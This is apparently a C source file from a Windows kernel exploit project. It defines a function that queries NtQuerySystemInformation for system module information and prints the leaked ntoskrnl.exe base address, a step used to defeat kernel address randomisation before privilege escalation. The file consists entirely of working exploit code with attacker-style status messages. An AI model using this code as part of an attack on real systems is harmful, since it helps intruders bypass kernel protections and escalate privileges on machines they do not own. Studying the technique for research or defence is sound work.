#include "exploit.h"

long long leak_ntoskrnl_base_address()
{
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	PSYSTEM_MODULE_INFORMATION p_module_info;
	unsigned long return_length = 0;
	NTSTATUS status = 0;
	long long leaked_address = 0;
	char unused = 0;

	RtlSecureZeroMemory(&p_module_info, sizeof(p_module_info));

	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the ntdll.dll API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Loaded the ntdll.dll API library. Handle Value: 0x%p", h_ntdll);

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the NtQuerySystemInformation function address. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the NtQuerySystemInformation function address. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	p_module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	status = _NtQuerySystemInformation(SystemModuleInformation, p_module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information.");

	if (p_module_info)
	{
		leaked_address = p_module_info->Modules[0].ImageBaseAddress;
		printf("\n[+] Successfully leaked the ntoskrnl.exe kernel base address. Kernel Base Address: 0x%p", (long long*)leaked_address);
		return leaked_address;
	}

	printf("\n[-] Failed to leak the ntoskrnl.exe kernel base address.");
	unused = getchar();

	return 0;
}